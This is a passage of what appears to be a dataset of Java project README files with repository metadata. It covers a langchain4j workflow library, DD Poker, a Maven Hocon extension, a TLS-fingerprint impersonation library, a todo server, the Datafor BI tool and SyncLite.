    Function<MyStatefulBean, String> node3Func = obj -> {
      obj.value +=3;
      System.out.println(""Node 3: ["" + obj.value + ""]"");
      return ""Node3: function proceed"";
    };
    Function<MyStatefulBean, String> node4Func = obj -> {
      obj.value +=4;
      System.out.println(""Node 4: ["" + obj.value + ""]"");
      return ""Node4: function proceed"";
    };

    // Create the nodes and associate them with the functions to be used during execution.
    Node<MyStatefulBean, String> node1 = Node.from(""node1"", node1Func);
    Node<MyStatefulBean, String> node2 = Node.from(""node2"", node2Func);
    Node<MyStatefulBean, String> node3 = Node.from(""node3"", node3Func);
    Node<MyStatefulBean, String> node4 = Node.from(""node4"", node4Func);


    // Create workflow
    StateWorkflow<MyStatefulBean> workflow = DefaultStateWorkflow.<MyStatefulBean>builder() 
            .statefulBean(myStatefulBean)
            .addNodes(Arrays.asList(node1, node2, node3))
            .build();

    // You can add more nodes after workflow build. E.g. node4
    workflow.addNode(node4);

    // Define edges
    workflow.putEdge(node1, node2);
    workflow.putEdge(node2, node3);
    // Conditional edge
    workflow.putEdge(node3, Conditional.eval(obj -> {
      System.out.println(""Stateful Value ["" + obj.value + ""]"");
      if (obj.value > 6) {
        return node4;
      } else {
        return node2;
      }
    }));
    workflow.putEdge(node4, WorkflowStateName.END);

    // Define which node to start
    workflow.startNode(node1);

    // Run workflow normally
    workflow.run();
    // OR
    // Run workflow in streaming mode
    workflow.runStream(node -> {
      System.out.println(""Processing node: "" + node.getName());
    });

    // Print all computed transitions
    String transitions = workflow.prettyTransitions();
    System.out.println(""Transitions: \n"");
    System.out.println(transitions);

    // Generate workflow image
    workflow.generateWorkflowImage(""image/my-workflow.svg"");
    // workflow.generateWorkflowImage(); // if you use this method, it'll use by default the root path and default image name.
  }
}
```
Now you can check the output of the workflow execution.

```shell
STARTING workflow in stream mode..
Processing node: node1
Node 1: [1]
Processing node: node2
Node 2: [3]
Processing node: node3
Node 3: [6]
Stateful Value [6]
Processing node: node2
Node 2: [8]
Processing node: node3
Node 3: [11]
Stateful Value [11]
Processing node: node4
Node 4: [15]
Reached END state
```
You can print all computed transitions:

```shell
START -> node1 -> node2 -> node3 -> node2 -> node3 -> node4 -> END
```
You can generate a workflow image with all computed transitions:

![Workflow Image](image/my-workflow.svg)

## LLM examples
You can check all examples in the [langchain4j-worflow-examples](https://github.com/czelabueno/langchain4j-workflow-examples) repository. Please note that examples can be modified and more examples will be added over time.
### MoA
- **Mixture-of-Agents (MoA)**:
  - Java example: [`langchain4j-moa`](https://github.com/czelabueno/langchain4j-workflow-examples/tree/main/langchain4j-moa)
  - Based on Paper: https://arxiv.org/pdf/2406.04692

### RAG
- **Corrective RAG (CRAG)**:
  - Java example: [`langchain4j-corrective-rag`](https://github.com/czelabueno/langchain4j-workflow-examples/tree/main/langchain4j-corrective-rag)
  - Based on Paper: https://arxiv.org/pdf/2401.15884
- **Adaptive RAG**:
  - Java example: _Very soon_
  - Based on Paper: https://arxiv.org/pdf/2403.14403
- **Self RAG**:
  - Java example: _Very soon_
  - Based on Paper: https://arxiv.org/pdf/2310.11511
- **Modular RAG**:
  - Java example: _Very soon_
  - Based on Paper: https://arxiv.org/pdf/2312.10997v1

### Agent Architectures
- **Multi-agent Collaboration**:
  - Java example: _Very soon_
  - Based on Paper: https://arxiv.org/pdf/2308.08155
- **Agent Supervisor**:
  - Java example: _Very soon_
  - Based on Paper: https://arxiv.org/pdf/2308.08155
- **Planning Agents**:
  - Java example: _Very soon_
  - Based on Paper: https://arxiv.org/pdf/2305.04091

## Contribute & feedback
If you have any feedback, suggestions, or want to contribute, please feel free to open an issue or a pull request. We are open to new ideas and suggestions.
Help us to maturity this project and make it more useful for the community in order to merge it with LangChain4j source code.

## Authors
- Carlos Zela [@c_zela](https://x.com/c_zela)
",0,2,1,0.0,"['workflow', 'overview', 'key', 'feature', 'installation', 'example', 'llm', 'example', 'moa', 'rag', 'agent', 'architecture', 'contribute', 'feedback', 'author']","['example', 'workflow', 'overview', 'key', 'feature']",1.0,[],0.0,1.0,0.0
dougdonohoe/ddpoker,main,"# DD Poker

## About

![dd-poker-3.jpg](images/dd-poker-3.jpg)

This repository contains all the source code for the DD Poker
computer game, the underlying game engine, the supporting 
backend server, and the companion website. The game itself is 
a Java Swing-based desktop application that is capable of running 
on Mac, Linux and Windows.  The backend-server is essentially
a Java Spring application that talks to MySQL.  The website 
(aka ""Online Portal"") is built on the Apache Wicket framework.

## Installers

See [Releases](https://github.com/dougdonohoe/ddpoker/releases) for the latest Mac, Linux and Windows installers.

[<img src=""images/install4j_small.png"">](https://www.ej-technologies.com/install4j)
Installers are built by [Donohoe Digital LLC](https://www.donohoedigital.com/) 
courtesy of a license to ej-technologies' 
[excellent multi-platform installer builder, install4j](https://www.ej-technologies.com/install4j).
We are grateful that they provided us an open-source license.

There is also an option to distribute a jar file, which the _Installers_ section of
the [Developer Notes](README-DEV.md) explains.

## TL;DR Running DD Poker From Source

If you are impatient and just want to run the DD Poker game without
reading all the [developer documentation](README-DEV.md) or worrying
about servers and databases, follow these steps:

1. Clone this repo
2. Install [Java 1.8](https://adoptopenjdk.net/releases.html?variant=openjdk8&jvmVariant=hotspot)
   and [Maven 3](https://maven.apache.org/install.html)
3. Run these commands in the `ddpoker` directory:

```shell
source ddpoker.rc
mvn-package-notests
poker
```

## Developer Notes

For details on how to build and run DD Poker and
the backend server and website, please see [README-DEV.md](README-DEV.md).

## History

DD Poker was developed by Donohoe Digital LLC, a small computer
games studio founded by Doug Donohoe in 2003.  Its first game,
[War! Age of Imperialism](https://www.donohoedigital.com/war/) was
a computer version of the eponymous table-top board game, and it
was a finalist in the 2005 Independent Games Festival.  After releasing
the game in October 2003, Doug was celebrating in Las Vegas
and, while at a poker tournament, the proverbial lightbulb went 
off that there were no good poker software simulators out there,
especially for tournaments.  Leveraging the game 
engine he built for War!, Doug immediately started building
a poker game.  Less that a year later, DD Poker was ready for 
release.

DD Poker 1.0 was originally released (and sold in boxes!) in 
June 2004 under the name 
_DD Tournament Poker No Limit Texas Hold'em_ and 
later re-released in early 2005 as _DD Tournament Poker 2005 Collector's 
Edition_, featuring Annie Duke on the box.  The game featured 
Limit, Pot-Limit and No-Limit Texas Hold'em against computer
components, a poker clock, but no online play.

DD Poker 2.0 added the ability to play online against other
human opponents, a sophisticated hand calculator, a brand-new UI, and dozens
of other new features.  It was originally released in August
2005 as _DD No Limit Texas Hold'em Tournament Edition_, featuring 
Phil Gordon on the box.  To support online play, a back-end
API server and companion ""Online Portal"" was built and operated
by Donohoe Digital.  New functionality continued to be added
until early 2007.

DD Poker 3.0 was released as donation-ware in January 2009,
adding only minor new features while removing license-key 
validation logic. It continued to be updated sporadically until 
it was shutdown in July 2017.

See [whatsnew.html](code/poker/src/main/resources/config/poker/help/whatsnew.html) 
for a detailed release history starting with version 2.0.

## Why Open Source?

Even though DD Poker and the backend servers was shutdown
in July 2017, folks continue to play it by manually
sharing game URLs.  There was a minor revival during the 
2020 pandemic and sporadic inquiries have come in over the
years.

While Donohoe Digital LLC can no longer
run the old DD Poker servers, there might be folks out there that
want to run servers for their own local poker communities.
Releasing the code allows them to do this.

In addition, even though the core code is almost 20 years
old, it still actually works and might be useful to
somebody, somewhere.

## Copyright and Licenses

Unless otherwise noted, the contents of this repository are
Copyright (c) 2003-2024 Doug Donohoe.  All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

For the full License text, please see the [LICENSE.txt](LICENSE.txt) file
in the root directory of this project.

The ""DD Poker"" and ""Donohoe Digital"" names and logos, as well as any images,
graphics, text, and documentation found in this repository (including but not
limited to written documentation, website content, and marketing materials)
are licensed under the Creative Commons Attribution-NonCommercial-NoDerivatives
4.0 International License (CC BY-NC-ND 4.0). You may not use these assets
without explicit written permission for any uses not covered by this License.
For the full License text, please see the [LICENSE-CREATIVE-COMMONS.txt](LICENSE-CREATIVE-COMMONS.txt) file.

For inquiries regarding commercial licensing of this source code or
the use of names, logos, images, text, or other assets, please contact
doug [at] donohoe [dot] info.

## Third Party Licenses and Other Open Source Code

DD Poker incorporates various other open source code, either directly as source files
or via maven dependencies as seen in the `pom.xml` files.  These are explained in 
[code/poker/src/main/resources/config/poker/help/credits.html](https://static.ddpoker.com/gamehelp/help/credits.html) and the licenses 
mentioned therein can be found in the `docs/license` directory.

Third party source code directly copied into this repository include the following:

* Zookitec Explicit Layout in `code/poker/src/main/java/com/zookitec/layout/*.java`
* `MersenneTwisterFast` random number generator in `code/common/src/main/java/com/donohoedigital/base/MersenneTwisterFast.java`
* `RandomGUID` generator in `code/common/src/main/java/com/donohoedigital/base/RandomGUID.java`
* `Base64` encode/decoder in `code/common/src/main/java/com/donohoedigital/base/Base64.java`

## Contributors

The following folks made excellent contributions to the DD Poker
code base as employees of Donohoe Digital:

+ Greg King
+ Sam Neth
+ Brian Zak
",2,0,1,4.0,"['dd', 'poker', 'about', 'installers', 'tl', 'dr', 'running', 'dd', 'poker', 'from', 'source', 'developer', 'note', 'history', 'why', 'open', 'source', 'copyright', 'license', 'third', 'party', 'license', 'other', 'open', 'source', 'code', 'contributor']","['source', 'dd', 'poker', 'open', 'license']",22.0,"[maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-dependency-plugin]",1.0,20.0,1.0
apache/maven-hocon-extension,main,"<!---
 Licensed to the Apache Software Foundation (ASF) under one or more
 contributor license agreements.  See the NOTICE file distributed with
 this work for additional information regarding copyright ownership.
 The ASF licenses this file to You under the Apache License, Version 2.0
 (the ""License""); you may not use this file except in compliance with
 the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an ""AS IS"" BASIS,
 WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 See the License for the specific language governing permissions and
 limitations under the License.
-->
[Apache Maven Hocon Extension](https://maven.apache.org/extensions/maven-xinclude-extension/)
==================================

[![Apache License, Version 2.0, January 2004](https://img.shields.io/github/license/apache/maven.svg?label=License)](https://www.apache.org/licenses/LICENSE-2.0)
[![Maven Central](https://img.shields.io/maven-central/v/org.apache.maven.extensions/maven-xinclude-extension.svg?label=Maven%20Central)](https://search.maven.org/artifact/org.apache.maven.extensions/maven-xinclude-extension)

This project provides a Hocon POM parser extension for Maven 4. It allows POMs to 
be written with the [Hocon](https://github.com/lightbend/config/blob/master/HOCON.md)
syntax, which is a superset of the [JSON](https://json.org/) syntax.

License
-------
This code is under the [Apache License, Version 2.0, January 2004][license].

See the [`NOTICE`](./NOTICE) file for required notices and attributions.

Usage
-----
To use this extension, the following declaration needs to be done in your `${rootDirectory}/.mvn/extensions.xml`:
```
<extensions xmlns=""http://maven.apache.org/EXTENSIONS/1.2.0"">
    <extension>
        <groupId>org.apache.maven.extensions</groupId>
        <artifactId>maven-hocon-extension</artifactId>
        <version>@project.version@</version>
    </extension>
</extensions>
```
This allows defining a POM using Hocon syntax:
```
modelVersion = 4.1.0
parent {
    groupId = org.apache.maven.hocon.its
    artifactId = parent
    version = 1.0.0-SNAPSHOT
}
artifactId = test

properties = {
  ""my.property"" = foo
  pluginVersion = 3.9
}

dependencies = [
    # just add one dummy dependency
    ""com.typesafe:config:1.4.2""
]
```
",0,0,3,2.0,"['add', 'one', 'dummy', 'dependency']","['add', 'one', 'dummy', 'dependency']",2.0,[],0.0,2.0,0.0
zhkl0228/impersonator,master,"# impersonator

impersonator is a fork of [BouncyCastle-bctls](https://github.com/bcgit/bc-java/commit/74a62440c93342a6743bb33c36a5ee224fc6c885) and [okhttp](https://github.com/square/okhttp/tree/parent-4.12.0) that is designed to impersonate TLS fingerprints.

`impersonator` can
impersonate browsers' TLS/JA3 and HTTP/2 fingerprints. If you are blocked by some
website for no obvious reason, you can give `impersonator` a try.

## Features
- Supports TLS/JA3/JA4 fingerprints impersonation.
- Supports HTTP/2 fingerprints impersonation.

## Usage

TLS/JA3/JA4 fingerprints impersonation
```xml
<dependency>
    <groupId>com.github.zhkl0228</groupId>
    <artifactId>impersonator-bctls</artifactId>
    <version>1.0.7</version>
</dependency>
```

TLS/JA3/JA4 fingerprints and HTTP/2 fingerprints impersonation
```xml
<dependency>
    <groupId>com.github.zhkl0228</groupId>
    <artifactId>impersonator-okhttp</artifactId>
    <version>1.0.7</version>
</dependency>
```
- [src/test/java/com/github/zhkl0228/impersonator/IOSTest.java](https://github.com/zhkl0228/impersonator/blob/master/src/test/java/com/github/zhkl0228/impersonator/IOSTest.java)
```java
ImpersonatorApi api = ImpersonatorFactory.ios();
SSLContext context = api.newSSLContext(null, null); // for TLS/JA3/JA4 fingerprints impersonation

OkHttpClientFactory factory = OkHttpClientFactory.create(api);
OkHttpClient client = factory.newHttpClient(); // for TLS/JA3/JA4 fingerprints and HTTP/2 fingerprints impersonation
```
",4,0,1,0.0,"['impersonator', 'feature', 'usage']","['impersonator', 'feature', 'usage']",3.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:build-helper-maven-plugin,org.jetbrains.kotlin:kotlin-maven-plugin]",0.0,2.0,1.0
devjlkeesh/httpserver,main,"# Simple Todo HTTP Server in Java

This project is a simple HTTP server for managing todo items, built using Java's standard HttpServer API. It allows users to create, read, update, and delete (CRUD) todo items through a RESTful API.

## Features

- Create a new todo item
- Read all todo items or a specific item
- Update an existing todo item
- Delete a todo item

## Getting Started

### Prerequisites

- Java Development Kit (JDK) 8 or higher
- postgresql
- ```sql
  create database httpserver;
  
  create table if not exists todos(
    id bigserial primary key,
    title varchar not null,
    description varchar not null,
    user_id bigint not null,
    priority varchar not null default 'LOW',
    done boolean default 'f' not null,
    created_at timestamp not null default current_timestamp 
  );
    ```
---
# build jar

```shell
mvn clean package
cd target
java -jar httpserverexec.jar
```

---

## API

- reads all todos
```
GET localhost:8080/todo
```

-  reads todo which has id 1
```
GET localhost:8080/todo/1 
```

- create todo
```
POST localhost:8080/todo

Content-Type : application-json
{
    ""title"":""Title for todo"",
    ""description"":""Description for todo"",
    ""user_id"":""User id which todo belongs to"",
    ""priority"":""HIGH""
}
```

- update todo
```
PUT localhost:8080/todo # update todo 

Content-Type : application-json
{
    ""id"":1,
    ""title"":""Title for todo"",
    ""description"":""Description for todo"",
    ""priority"":""HIGH"",
    ""completed"":true
}
```",0,0,1,0.0,"['simple', 'todo', 'http', 'server', 'java', 'feature', 'get', 'start', 'prerequisite', 'build', 'jar', 'api', 'update', 'todo']","['todo', 'simple', 'http', 'server', 'java']",1.0,[org.apache.maven.plugins:maven-shade-plugin],0.0,1.0,0.0
datafor123/datafor-free,master,"# Datafor Visualization and Analysis

Datafor Visualization and Analysis is a self-service agile BI tool that provides intuitive and user-friendly data visualization and analysis capabilities to help users quickly explore, analyze, and make decisions with their data.

Datafor is developed based on [Pentaho BA Server Core](https://github.com/pentaho/pentaho-platform).


## Features

**Data Connectivity:** Supports connecting to various data sources, including relational databases, NoSQL databases, data warehouses, cloud data sources, and file data sources.

**Data Visualization:** Offers a rich variety of visual charts and elements with customization options, enabling users to easily create beautiful data analysis reports and data visualization pages.

**Multidimensional Analysis:** Provides powerful multidimensional analysis capabilities to help users delve into the patterns and relationships behind the data, uncovering potential business opportunities and issues.

**Embedded Analytics:** Supports embedding data visualization and analysis functions into other applications to achieve real-time data visualization and analysis.

## Screenshots

#### WYSIWYG Designer


<div style=""text-align:center"">
  <img class=""img-responsive"" src=""https://github.com/datafor123/docs/raw/main/images/1%20visualizer.PNG""  />
</div>

#### Create multi-dimensional models in a few clicks

<div style=""text-align:center"">
  <img class=""img-responsive"" src=""https://github.com/datafor123/docs/raw/main/images/4%20modeler.png""  />
</div>

#### Interactive analysis report

<div style=""text-align:center"">
  <img class=""img-responsive"" src=""https://github.com/datafor123/docs/raw/main/images/demo2.gif""  width=""100%"" />
</div>

#### Cool visualization

<div style=""text-align:center"">
  <img class=""img-responsive"" src=""https://github.com/datafor123/docs/raw/main/images/5%20demo.PNG""  />
</div>

## Get Datafor

You can download Datafor(free edition) for the following platforms:

- [Linux](https://github.com/datafor123/datafor-free/releases/download/6.06/datafor-server-free-linux-6.06.zip)
- [Windows](https://github.com/datafor123/datafor-free/releases/download/6.06/datafor-server-free-windows-6.06.zip)

## Install Manual

- [CentOS](https://help.datafor.com.cn/docs/en/20%20setup/datafor-centos)
- [Ubuntu](https://help.datafor.com.cn/docs/en/20%20setup/datafor-ubuntu)
- [Windows](https://help.datafor.com.cn/docs/en/20%20setup/datafor-windows)
- [Docker](https://help.datafor.com.cn/docs/en/20%20setup/datafor-docker)

## Get Help

- For bug reports and feature requests, visit our [GitHub Issues](https://github.com/datafor123/datafor-free//issues) page.
- For general questions, email us at [support@datafor.com.cn](mailto:support@datafor.com.cn).
- Refer to the [help](https://help.datafor.com.cn/docs/en/) documentation for additional assistance.

## Free Edition V.S. Enterprise Edition

The Enterprise Edition offers significant advantages over the Free Edition, including support for more data sources, advanced analysis and visualization features, enhanced security, improved integration options, and optimized system performance.

<table>
  <tr>
    <th colspan=""2"" style=""width:40%;text-align:center;"">Features</th>
    <th style=""width:30%;text-align:center;"">Free Edition</th>
    <th style=""width:30%;text-align:center;"">Enterprise Edition</th>
  </tr>
  <tr>
    <td rowspan=""2"" style=""width:15%"">Data Sources</td>
    <td style=""width:25%"">Relational Databases</td>    
    <td align=""center"">MySQL, PostgreSQL, Oracle, MS SQL Server</td>
    <td align=""center"">Addition: GaussDB, Gaussdb2000, Greenplum, Tidb, Clickhouse, SparkSQL, Cloudera Impala, Snowflake, Impala, Hadoop Hive 2, Hana, InfluxDB, MongoDB,  Doris, Redshift</td>
  </tr>
  <tr>
    <td >File Upload (CSV, Excel)</td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td rowspan=""5"">Analysis Models</td>
    <td>Multidimensional Modeling</td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Data Masking</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Data Dictionary</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Calculated Fields</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td><a href=""https://help.datafor.com.cn/docs/en/70%20analysis/analysis-calculated-measures"" target=""_blank"">Calculated Measures</a></td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td rowspan=""8"">Visualization</td>
    <td>Charts</td>
    <td align=""center"">Pivot Table, Table, KPI Card, Dimension Field Information, Clustered Column Chart, Stacked Column Chart, 100% Stacked Column Chart, Clustered Bar Chart, Stacked Bar Chart, 100% Stacked Bar Chart, Line Chart, Column Line Chart, Pie Chart, Scatter Plot, Sunburst Chart, Gauge, Sankey</td>
    <td align=""center"">Additionï¼šParent-Child Tree Table, Hierarchical Tree Table, </td>
  </tr>
  <tr>
    <td>Maps</td>
    <td align=""center"">Filled GeoJson Map, Marker GeoJson Map, GIS Marker Map</td>
    <td align=""center"">Additionï¼šHeat Map, Mapbox/AMap, Image Map</td>
  </tr>
  <tr>
    <td>Assists Components</td>
    <td align=""center"">Image File, Tabs, Text, SVG, Icon Fonts, Rectangle, Line, Ellipse, Hyperlink</td>
    <td align=""center"">Addition: Hyperlink</td>
  </tr>
  <tr>
    <td>Filter Components</td>
    <td align=""center"">Dropdown, List Box, Button, Radio/Checkbox, Date, Date Range, Timeline, Range Timeline, Numeric Range Filter</td>
    <td align=""center"">Addition: Pager, Search</td>
  </tr>
  <tr>
    <td>Custom Styles</td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Parameter Controller</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Mobile Layout</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Export to PDF, PNG, CSV, Excel</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td rowspan=""6"">Analysis</td>
    <td><a href=""https://help.datafor.com.cn/docs/en/70%20analysis/analysis-cross-filtering"" target=""_blank"">Cross-Model analytics</a></td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td><a href=""https://help.datafor.com.cn/docs/en/70%20analysis/kzt-jmgnjs"" target=""_blank"">Drill Down</a></td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Custom Events</td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td><a href=""https://help.datafor.com.cn/docs/en/70%20analysis/analysis-Drill-through"" target=""_blank"">Drill Through</a></td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td><a href=""https://help.datafor.com.cn/docs/en/70%20analysis/analysis-parameters"" target=""_blank"">Parameters</a></td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td><a href=""https://help.datafor.com.cn/docs/en/70%20analysis/analysis-calculated-measures"" target=""_blank"">Calculated Measures</a></td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td rowspan=""3"">Security</td>
    <td>File, Folder, and Analysis Model Access Control</td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Row-Level Security</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Object-Level Security</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td rowspan=""7"">Integration and Embedding</td>
    <td>Single Sign-On</td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Share Links</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>LDAP</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>CAS</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>JWT</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>WeChat</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>DingTalk</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td rowspan=""8"">System</td>
    <td>Users and Roles</td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Report Export/Import</td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Analysis Model Export/Import</td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Lineage Analysis</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Log Auditing</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>ETL Scheduling (Integrated with Kettle)</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Backup and Restore</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Enterprise Data Portal</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td rowspan=""2"">Performance</td>
    <td>Pre-Aggregated Tables</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Query and Model Caching</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td rowspan=""4"">Support</td>
    <td>Help document</td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Training</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Technical Support</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Customization</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
</table>


## Contact us

marketing@datafor.com.cn





",1,0,1,0.0,"['datafor', 'visualization', 'analysis', 'feature', 'screenshots', 'wysiwyg', 'designer', 'create', 'model', 'click', 'interactive', 'analysis', 'report', 'cool', 'visualization', 'get', 'datafor', 'install', 'manual', 'get', 'help', 'free', 'edition', 'enterprise', 'edition', 'contact', 'u']","['datafor', 'visualization', 'analysis', 'get', 'edition']",20.0,"[com.google.code.maven-replacer-plugin:replacer,com.mycila:license-maven-plugin,maven-antrun-plugin,maven-checkstyle-plugin,maven-dependency-plugin,maven-jar-plugin,maven-javadoc-plugin,maven-jxr-plugin,maven-source-plugin,maven-war-plugin,org.apache.maven.plugins:maven-dependency-plugin,org.codehaus.mojo:cobertura-maven-plugin,org.codehaus.mojo:gwt-maven-plugin]",3.0,8.0,9.0
syncliteio/SyncLite,main,"
<p align=""center"">
  <a href=""https://www.synclite.io"">
  <img src=""docs/images/SyncLite_logo.png"" alt=""SyncLite - Build Anything Sync Anywhere"">
  </a>
  <p align=""center"">
    <a href=""https://www.synclite.io"">Learn more</a>
    Â·
    <a href=""https://join.slack.com/t/syncliteworkspace/shared_invite/zt-2pz945vva-uuKapsubC9Mu~uYDRKo6Jw"">Chat on Slack</a>
  </p>
</p>

# SyncLite - Build Anything Sync Anywhere

<a href=https://www.synclite.io>SyncLite</a> is an open-source, low-code, comprehensive relational data consolidation platform enabling developers to rapidly build data intensive applications for edge, desktop and mobile environments. SyncLite enables real-time, transactional data replication and consolidation from various sources including edge/desktop applications using popular embedded databases (SQLite, DuckDB, Apache Derby, H2, HyperSQL), data streaming applications, IoT message brokers, traditional database systems(ETL) and more into a diverse array of databases, data warehouses, and data lakes, enabling AI and ML use-cases at edge and cloud.

<p align=""center"">
  <a href=""https://www.synclite.io"">
  <img src=""docs/images/SyncLite_Overview.png"" width=""80%"" height=""80%"" alt=""SyncLite - Build Anything Sync Anywhere"">
  </a>
</p>

SyncLite enables following scenarios for industry leading databases, data warehouse and data lakes.

## Build Sync-Ready Applications: 
SyncLite provides a novel CDC replication framework for embedded databases, helping developers quickly build data-intensive applications, including Gen AI Search and RAG applications, for edge, desktop, and mobile environments. It integrates seamlessly with popular embedded databases like SQLite, DuckDB, Apache Derby, H2, and HyperSQL (HSQLDB), enabling Change Data Capture (CDC), transactional, real-time data replication, and consolidation into industry-leading databases, data warehouses, and data lakes. 

```SyncLite Logger```, an embeddable Java library (JDBC driver), captures all SQL transactions in log files that can be consumed by Java and Python applications for efficient data syncing.

```SyncLite DB```, a standalone sync-enabled database, accepting SQL requests in JSON format over HTTP, making it compatible with any programming language (Java, Python, C++, C#, Go, Rust, Ruby, Node.js etc.) and ideal for flexible, real-time data integration and consolidation, right from edge/desktop applications into final data destinations.
```

{Edge/Desktop Apps} + {SyncLite Logger + Embedded Databases} ---> {Staging Storage} ---> {SyncLite Consolidator} ---> {Destination DB/DW/DataLakes}
```

```
{Edge/Desktop Apps} ---> {SyncLite DB + Embedded Databases} ---> {Staging Storage} ---> {SyncLite Consolidator} ---> {Destination DB/DW/DataLakes}
```

Learn more: 

https://www.synclite.io/synclite/sync-ready-apps

https://www.synclite.io/solutions/gen-ai-search-rag


## Build Streaming Applications For Last Mile Delivery: 
SyncLite facilitates development of large-scale data streaming applications through SyncLite Logger, which offers both a Kafka Producer API and SQL API. This allows for the ingestion of massive amounts of data and provides the capability to query the ingested data using the SQL API within applications. Together, SyncLite Logger and SyncLite Consolidator enable seamless last-mile data integration from thousands of streaming application instances into a diverse array of final data destinations.

```
{Data Streaming Apps} + {SyncLite Logger} ---> {Staging Storage} ---> {SyncLite Consolidator} ---> {Destination DB/DW/DataLakes}
```

```
{Data Streaming Apps} ---> {SyncLite DB} ---> {Staging Storage} ---> {SyncLite Consolidator} ---> {Destination DB/DW/DataLakes}
```

Learn more: https://www.synclite.io/synclite/last-mile-streaming


## Deploy Database ETL/Replication/Migration Pipelines:
Set up many-to-many, scalable database replication/migration/incremental ETL pipelines from a diverse range of source databases and raw data files into a diverse range of destinations.

```
{Source Databases} ---> {SyncLite DBReader} ---> {Staging Storage} ---> {SyncLite Consolidator} ---> {Destination DB/DW/DataLakes}
```

Learn More: https://www.synclite.io/solutions/smart-database-etl

## Setup Rapid IoT Data Connectors:
Connect numerous MQTT brokers (IoT gateways) to one or more destination databases.

```
{IoT Message Brokers} ---> {SyncLite QReader} ---> {Staging Storage} ---> {SyncLite Consolidator} ---> {Destination DB/DW/DataLakes}
```
